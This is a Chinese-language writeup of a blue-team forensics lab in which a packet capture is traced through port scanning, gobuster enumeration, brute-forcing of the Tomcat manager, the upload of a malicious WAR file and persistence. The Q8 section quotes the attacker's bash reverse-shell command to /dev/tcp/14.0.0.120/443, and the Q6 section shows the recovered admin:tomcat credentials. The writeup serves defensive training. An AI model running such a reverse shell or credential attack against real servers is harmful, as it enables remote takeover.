---
title: Tomcat Takeover Lab
published: 2025-08-08
updated: 2025-08-08
description: "CyberDefenders Tomcat Takeover Lab writeup"
image: "/assets/cyberdefenders/Tomcat_Takeover_Lab/cover.png"
tags: ["CyberDefenders", "Blue Team CTF"]
category: "CyberDefenders"
draft: false
---

# Tomcat Takeover Lab

[Lab 連結](https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/)

## Q1

可以找到很多由 `14.0.0.120` 發送的 `SYN` ，但是伺服器一直回傳 `RST, ACK`，可能是拒絕連線

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102155.png)

所以看起來是 `14.0.0.120` 正在掃 port

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102189.png)

## Q2

用 [Instant IP Address Lookup](https://whatismyipaddress.com/ip-lookup) 可以知道這個 ip 來自中國

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102221.png)

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102273.png)

## Q3

在 wireshark 搜尋包含 admin 的字串

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102306.png)

會發現 /admin 的 host 是 `10.0.0.112: 8080`

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102340.png)

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102376.png)

## Q4

不知道要怎麼確認攻擊者列舉目錄時使用的工具，偷偷看了 Hint

攻擊者在掃描或列舉目標網站的路徑或服務時會嘗試一些不存在的頁面，而導致 404，所以就去 wireshark 搜尋包含 404 的封包

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102411.png)

`User-Agent` 可能留有特徵字串，所以從 `User-Agent` 可以知道攻擊者使用的工具是 `gobuster`

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102442.png)

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102472.png)

## Q5

用 `tcp.port == 8080 && ip.addr == 14.0.0.120 && http.request.method == "GET"` 篩選出攻擊者對 Tomcat 8080 端口的所有 HTTP GET 請求。

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102505.png)

其中`GET /manager/html` 可以發現攻擊者一直在以不同帳號密碼嘗試登入，所以可以知道攻擊者是發現 `/manager` 與 admin 頁面有關

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102537.png)

## Q6

在 `GET /manager/html` 成功得到回應的`Authorization`可以得到 Base64 ，用 CyberChef decode 之後可以得到帳號密碼 `admin:tomcat`

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102570.png)

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102610.png)

## Q7

可以在 `POST /manager/html/upload` 中找到被上傳的檔案 `JXQOZY.war`

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102640.png)

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102670.png)

## Q8

檢查檔案上傳後的 TCP Stream

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102701.png)

就能發現攻擊者透過 `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'` 確保在受感染的電腦上保持持久性

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102755.png)

![](/assets/cyberdefenders/Tomcat_Takeover_Lab/IMG-20250808205102788.png)

---

```txt
I successfully completed Tomcat Takeover Blue Team Lab at @CyberDefenders!
https://cyberdefenders.org/blueteam-ctf-challenges/achievements/n1ght0w1/tomcat-takeover/

#CyberDefenders #CyberSecurity #BlueYard #BlueTeam #InfoSec #SOC #SOCAnalyst #DFIR #CCD #CyberDefender
```

---

## 工具

[Instant IP Address Lookup](https://whatismyipaddress.com/ip-lookup)
查詢 ip

[A-Packets](https://apackets.com/)
分析封包
